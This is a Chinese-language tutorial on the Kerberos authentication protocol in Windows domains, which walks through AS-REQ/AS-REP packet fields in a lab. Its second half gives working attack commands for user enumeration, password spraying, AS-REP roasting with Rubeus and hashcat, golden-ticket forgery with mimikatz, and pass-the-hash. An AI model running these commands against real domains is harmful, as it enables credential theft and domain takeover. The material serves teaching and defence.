## Kerbroes

Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客 户机 /
服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求
网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一
种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。

 **Kerberos的标志是三只狗头，狗头分别代表以下角色：**

> Client
>
> Server
>
> KDC(Key Distribution Center) = DC(Domain Controller)

kerberos使用了一个包含客户端、应用服务器和一个kerbroes服务器的协议，这个协议的设计就是对抗客户端/服务器对话安全的多种威胁。在一个不受保护的网络中，任何一个客户端可以使用任意一台服务器提供的服务。很明显的安全威胁就是伪装，对方可以扮演另一个客户端并在服务器上获取没有经过验证的权限！所以服务器必须能确认请求服务的客户端的身份进行验证。为了避免给服务器更多的访问压力和每次和客户端交互的风险，使用认证服务器(AS),它存储了所有用户的口令并集中在一个数据库中，然后用户就可以登陆AS进行验证身份，如果验证通过的话它就可以把信息传达到一个应用服务器。

Kerberos协议有两个基础认证模块：AS_REQ & AS_REP 和 TGS_REQ & TGS_REP ，以及微软扩展的两个认证模块S4U 和
PAC 。

> S4U是微软为了实现委派而扩展的模块，分为 S4U2Self 和 S4U2Proxy 。这两个协议在委派攻击的时候会需要特别的学习。
>
>
> 在Kerberos最初设计的流程里说明了如何证明客户端的身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。所以微软为了解决权限这个问题，引入了
> PAC (Privilege Attribute Certificate，特权属性证书)
> 的概念。当一个用户与KDC之间完成了认证之后，客户端需要访问服务端所提供的某项服务，这个时候服务端就会判断客户端是否具有合法的权限，需要客户端的User
> SID等一些能能够代表到客户端的信息发送给KDC，接着KDC通过客户端发来的信息来判断验证用户组信息、用户权限等等，然后再把判断验证后的信息发送给服务端，接着服务端在将此信息与用户所请求的资源ACL进行判断比较，最后在决定是否给客户端访问服务的权限。

 **名词基本概念：**

> KDC: Key Distribution
> Center，密钥分发中心，负责管理票据、认证票据、分票据，但是KDC不是一个独立的服务，它由AS和TGS组成。
>
> AS: Authentication Service，验证服务，为client生成TGT的服务
>
> TGS: Ticket Granting Service，票据授予服务，为client生成某个服务的ticket
>
> TGT: Ticket Granting Ticket，入场券，通过入场券能够获得票据，是一种临时凭证的存在。
>
> Ticket:票据，是网络中各对象之间互相访问的凭证
>
> AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。
>
> DC: Domain Controller，域控
>
> KRBTGT: 每个域控制器都有一个krbtgt账户，是KDC的服务账户，用来创建TGS加密的密钥。

![](https://image.3001.net/images/20210305/1614879114_6041198abf80662e6f2aa.png!small)

其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。

这里参考一下云影实验室在安全客发表的文章 《Kerberos协议探索系列之扫描与爆破篇》中，将kerberos流量很形象解释。

如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是就是车站的认证系统。如果Client端的票据是合法的（由你本人身份购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票从头到尾只有一张。  
由上图中可以看到KDC又分为两个部分：

Authentication Server： AS的作用就是验证Client端的身份（确定你是身份上的本人），验证通过就会给一张TGT（Ticket
Granting Ticket）票给Client。  
Ticket Granting Server：
TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（Service Ticket）也有资料称为TGS
Ticket，为了和TGS区分，在这里就用ST来说明。

![](https://image.3001.net/images/20210305/1614879136_604119a051f8a1d8cea86.png!small)

 **域认证流程:**

1.client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的，
也就是白名单黑名单的说法。这就是AS服务完成的工作，通过 在AD中存储黑名单和白名单来区分client。成功后，返回AS返 回TGT给client。

2.client得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client
消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。

3.client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。

![](https://image.3001.net/images/20210305/1614879153_604119b1a7ac5f6d78fee.png!small)

第一步首先用户登陆到一个工作站并请求访问一个特定的服务器，客户端把一个包含用户ID和被称为TGT(Ticket-Granting
Ticket,票据授予票据，也可也称为入场券)请求的消息发送到AS。其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能直接进入下一步获取Ticket；AS在它的数据库中查找用户的口令，然后AS回复一个TGT和一个称为会话密钥的一次性加密密
钥(可以称之为Session
Key)给客户端。这两个加密都是使用用户口令作为加密密钥。然后发送给客户端，这个时候会提示客户端输入口令，产生密钥，并且解开发来的信息，如果提供了正确的口令，票据(ticket)和会话密钥就会被恢复。票据组成了一个客户端用来请求服务的信任证书的合集，票据显示AS已经接收了这个客户端和用户。票据包含了用户ID、一个时间戳、票据的失效时间。整个票据使用AS和服务器共享的DES密钥加密。这个时候客户端会向AS发送TGT和解密的Session
Key。

> Session Key用于客户端向TGS服务通信。
>
> 域内所有网络对象的凭证都在AD中保存
>
> KDC中某个用户指的是krbtgt

下图借用倾旋大佬博客[彻底理解Windows认证中](https://payloads.online/archivers/2018-11-30/1)的图，这图实在是太棒了。

![](https://image.3001.net/images/20210305/1614879180_604119ccdada5c9e7838e.png!small)

 **数据结构图：**

![](https://image.3001.net/images/20210305/1614879194_604119da34de4eb754df3.png!small)

![](https://image.3001.net/images/20210305/1614879215_604119ef8bde7eda3150f.png!small)

第二步这个时候Kerberos与客户端已经建立起来了，客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session
Key加密的客户端信息跟时间戳；
如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session
Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信； 验证通过后，就会生成一个新的Session
Key，我们称之为Server Session Key，这个Server Session
Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。

![](https://image.3001.net/images/20210305/1614879231_604119ff537759cc26107.png!small)

![](https://image.3001.net/images/20210305/1614879238_60411a06555658fa3a84d.png!small)

第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。

> Ticket客户端无法解密
>
> 服务器端通过解密Ticket解密Server Session Key(Client info +Timestamp)
>
> 比较时间长度校验通过后，认证成功，该票据会一直存在客户端内存中。

![](https://image.3001.net/images/20210305/1614879255_60411a170c76ccf99fe83.png!small)

## Kerbroes协议分析之AS-REQ & AS-REP

这里获取一些kerberos的数据包，这里我的环境如下

> 域控：DC 用户：administrator IP：192.168.8.141
>
> 成员：DM 用户：user0x1 IP：192.168.8.140

这里我是在域控抓包，然后域成员user0x1登录到DM机器。

![](https://image.3001.net/images/20210305/1614879274_60411a2a3441445c65fac.png!small)

首先客户端肯定是需要先获取到TGT认证的票据的。TGT是KDC中的AS认证服务器来进行发放的。这一步的请求是AS-REQ和AS-REP

## AS_REQ数据包请求：

一开始客户端发起请求，用户输入用户名和密码，通过Kerberos协议向KDC的AS认证服务发送了第一个请求，也就是AS-REQ认证请求。里面会包含有用户名、客户端的主机名、加密类型等。这里查看一下数据包。

![](https://image.3001.net/images/20210305/1614879314_60411a526c983088d187b.png!small)

pvno:Kerberos的版本号

msg-type：从字面上的意思我的理解就是消息类型，这里的意思是消息类型, AS_REQ 对应的是 krb-as-req(10)

padata主要认证的一些认证消息，每个认证消息有type和value。

> PA-DATA pA-ENC-TIMESTAMP：这个是预认证，就是用用户hash加密时间戳，作为 -> value发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过。在内网渗透中我看有一个攻击手法叫做PTH，也就是说我们可以不通过明文密码来进行验证，可以通过hash值来进行验证登录，造成这个的原因是因为这里是用用户的Hash加密的，也就造成了PTH攻击了。
>
> padata-type： pA-ENC-TIMESTAMP 字面上意思可以理解为padata的类型，这里的类型是 pA-ENC-TIMESTAMP
>
> 后面一个padata-vaule 里面的数据就是padata的值，etype是加密类型，cipher是密钥

PA-DA PA-PAC-REQUEST：这个是启用PAC支持的扩展。PAC(Privilege Attribute
Certificate)并不在原生的kerberos里面，是微软引进的扩展。PAC包含在AS_REQ的响应body(AS_REP)。这里的value对应的是include=true或者include=false(KDC根据include的值来判断返回的票据中是否携带PAC)。

![](https://image.3001.net/images/20210305/1614879330_60411a6246b4ca630e1f8.png!small)

PA-DA PA-PAC-REQUEST里面的三个值，一个是padata-type，这里它的值是pA-PAC-REQUEST(128)。接着就是padata-value。最后就是include-pac，字面上意思就是是否保护PAC，这里的值为True

req-body里面有包含有一些特别的数据，包含了一些客户端的信息。这里选择一些重要的来解释。里面Padding就是填充值，kdc-options就是和KDC的一些选项设置

![](https://image.3001.net/images/20210305/1614879346_60411a72e825dc8f6186f.png!small)

> cname：如果让我从字面上意思猜测，我觉得就是Client name。没错这就是客户端的用户名，在AS_REQ里面cname
> 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。就和WEB后台中输入一个错误的用户名，后台回复显示用户名差不多，这样就导致了用户名枚举
>
> realm：域名
>
> sname：PrincipalName 类型，在AS_REQ里面sname是krbtgt，类型KRB_NT_SRV_INST
>
> till:到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具。
>
> rtime：也是到期时间，两个值一样的
>
> nonce：随机生成的一个数kekeo/mimikatz nonce是12381973，rubeus
> nonce是1818848256，这个也可以用来作为特征检测工具。
>
> etype：就是加密类型，后面带有6 items。

![](https://image.3001.net/images/20210305/1614879367_60411a87468332b477104.png!small)

addresses：就是客户端的地址，后面的值是DM也就是客户端的机器名

> HostAddress :DM(20)
>
> NetBIOS Name: DM(20) (Server service)

## AS-REP数据回复包：

当KDC收到了客户端发来的信息之后，通过活动目录查询到这个用户的Hash(域内用户的hash都是保存在域控的)。利用这个用户的hash对请求包进行解密，成功的话表示请求者的密码是正确的，并且我们知道这一步KDC是会验证时间戳的，防止数据被中间人窃取，防止在破解到数据。通过验证之后krbtgt的NTLM
Hash加密这个TGT和用户NTLM Hash。该Login Session
Key的作用是用于确保客户端和KDC下阶段之间通信安全。最后TGT认购权证、加密的Lgoin Session Key、时间戳 和
PAC等信息会发送给客户端。PAC中包含用户的SID，用户所在的组等一些信息。

![](https://image.3001.net/images/20210305/1614879393_60411aa1c50a2ab66fae5.png!small)

msg-type：AS_REQ的响应body对应的就是krb-as-rep(11)

crealm：这里的值是域名，也就是我当前环境的域名one.com

cname：用户名 user0x1

ticket：这个就是票据了

> tkt-von：版本号，第五版本
>
> realm：域名
>
> sname：字面上意思我觉得就是server name哈哈哈。里面包含两个，krbtgt用户和域名one.com
>
> enc-> part：这部分是加密的，并且用的就是krbtgt的hash进行加密的，例如我们在拿到了一个域控制器的权限之后，导出域控中krbtgt的hash之后我们就可以伪造制作一张黄金票据了。([黄金票据的利用](http://www.ji4n.cn/index.php/archives/1616/#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-> golden-ticket-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB))

enc-part：这部分是加密的，但是用的是用户hash进行加密的，所以这部分可以通过用户的hash来作为key进行解密

![](https://image.3001.net/images/20210305/1614879413_60411ab52ada872b3e34c.png!small)

凭据里面最核心的东西是session-key和加密的ticket。正常我们用工具生成的凭据是.ccache和.kirbi后缀的，用mimikatz，kekeo，rubeus生成的凭据是以.kirbi后缀的。impacket
生成的凭据的后缀是.ccache。两种票据主要包含的都是session-key和加密的ticket，因此可以相互转化。

## AS-REQ & AS-REP 中的安全问题

### AS-REQ & AS-REP 中的安全问题用户名枚举

在上面的时候有提到用户名枚举的问题，这就是因为当用户名错误的时候和密码错误的时候返回的信息不一样。这里我使用的是daiker大佬写的一个kerberos测试工具，可以用来发kerberos数据包。  
下面这图是用户名正确，但是密码错误的情况返回来的error-code。

![](https://image.3001.net/images/20210305/1614879434_60411aca50cfb2ca8622b.png!small)

下图是用户名错误，但是密码正确的情况返回来的error-code

![](https://image.3001.net/images/20210305/1614879450_60411ada77641360b9f01.png!small)

用户枚举的工具很多，这里有一个域用户枚举工具kerbrute不错，exe二进制版本的，上传即可使用。

    
    
    kerbrute_windows_amd64.exe userenum --dc 10.10.12.77 -d xxxx.com u.txt

![](https://image.3001.net/images/20210305/1614879469_60411aed42c0160a667de.png!small)

python脚本pyKerbrute，这个脚本需要python环境，但是用起来感觉不kerbrute快。而且准确率也不错。

![](https://image.3001.net/images/20210305/1614879486_60411afe1c0a40e0cda50.png!small)

AS-REQ & AS-REP 中的安全问题之密码喷洒

密码喷洒，是用固定的密码去跑用户名，下面是使用powershell的脚本来进行密码喷洒

    
    
    Invoke-DomainPasswordSpray -Userlist user.txt -Domain domain -password Admin12345

![](https://image.3001.net/images/20210305/1614879522_60411b220c23f1c457101.png!small)

二进制工具kerbrute

    
    
    kerbrute_windows_amd64.exe passwordspray -d domain user.txt DomainUser123!

![](https://image.3001.net/images/20210305/1614879540_60411b34359351ecbcf1f.png!small)

更多的利用手法可以看3gstudent师傅的文章

    
    
    https://www.4hou.com/posts/N5om
    

### AS-REQ & AS-REP 中的安全问题之AS-REPRoasting

对于域用户，如果设置了选项”Do not require Kerberos
preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype
23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令。通常这个设置默认不开启的。

![](https://image.3001.net/images/20210305/1614879563_60411b4b9fe276be49677.png!small)

通过Rubeus可以获取到Hash。

    
    
    Rubeus.exe asreproast

![](https://image.3001.net/images/20210305/1614879599_60411b6f590617924cc0f.png!small)

或者使用powershell版本的工具也是可以的，效果差不多

    
    
    Import-Module .\ASREPRoast.ps1
    Get-ASREPHash -UserName user -Domain one.com | Out-File -Encoding ASCII hash.txt
    

获取到了hash之后保存AS-REP
hash后面的值，最终我们需要爆破的hash格式如下，Rubeus获取的hash值在$krb5asrep后面在添加$23即可

    
    
    $krb5asrep$23$userName@domain:repHash

![](https://image.3001.net/images/20210305/1614879616_60411b802667cd6dc1df8.png!small)

接着使用hashcat来进行离线的暴力破解。

    
    
    .\hashcat.exe -m 18200  '$krb5asrep$23$user0x1@one.com:(hash部分)' .\pass.txt

![](https://image.3001.net/images/20210305/1614879638_60411b967b63d160bc852.png!small)

AS-REQ & AS-REP 中的安全问题之黄金票据

黄金票据是当获取到了krbtgt的hash，在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的。当我们获取域控的访问权限，并且有权限导出krbtgt用户的hash之后就可以伪造到任意用户的TGT票据了，这样我们就可以访问到任意用户。

    
    
    privilege::debug  #提权
    kerberos::golden /admin:Administrator /domain:eve.com /sid:S-1-5-21-3445932950-957411282-1849150570 /krbtgt:5aa5abf5f2c23b385cf613c8ee83fc02 /ticket:ticket.kiribi
    # kerberos::golden /admin:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的哈希 /ptt
    
    或者也可以使用krbtgt的AES-256
    privilege::debug  #提权
    kerberos::golden /admin:administrator /domain:eve.com /sid:S-1-5-21-3445932950-957411282-1849150570 /aes256:d3d5e4c1cb01d141e9b65917b4948e050eb08793d4b68c617c89f70f6649550a /ticket:ticket.kiribi
    

使用krbtgt的哈希导出票据

![](https://image.3001.net/images/20210305/1614879659_60411bab7aa942fbebe40.png!small)

命令执行之后提示保存成功，此时会在本地目录下生成一个票据，接下来将票据注入到内存

    
    
    kerberos::ptt ticket.kiribi

![](https://image.3001.net/images/20210305/1614879674_60411bba9f4f020d85877.png!small)

在mimikatz中输入如下命令，查看刚刚注入的票据

    
    
    kerberos::tgt

![](https://image.3001.net/images/20210305/1614879694_60411bce3918b159c2535.png!small)

然后在我们域成员主机上的CMD窗口可以查看到该票据

![](https://image.3001.net/images/20210305/1614879735_60411bf7badad1ca66d79.png!small)

也可以在mimikatz中查看该票据

    
    
    #以下两个命令均可以看到当前会话中的票据
    kerberos::list
    kerberos::tgt

![](https://image.3001.net/images/20210305/1614879752_60411c0812282f8eb6a90.png!small)

这个时候我们已经有了高权限的票据并且导入进了内存。在命令行下访问dc的C盘，访问成功

![](https://image.3001.net/images/20210305/1614879771_60411c1b411698aa8dcd8.png!small)

### AS-REQ & AS-REP 中的安全问题Pass The Hash & Pass The Key

由于AS-REQ中使用的是用户hash来进行加密时间戳，不需要明文，也可以使用AES加密的密文来进行PTH

    
    
    privilege::debug
     
    sekurlsa::pth  /user:user0x1 /domain:one.com /ntlm:6542d35ed5ff6ae5...

![](https://image.3001.net/images/20210305/1614879793_60411c31d7389deaed01d.png!small)

    
    
    privilege::debug
    sekurlsa::ekeys          #获取kerberos加密凭证
    sekurlsa::pth  /user:user0x1 /domain:one.com /aes256:f74b379b5b422819db6...

![](https://image.3001.net/images/20210305/1614879828_60411c54cd6a02da336c9.png!small)

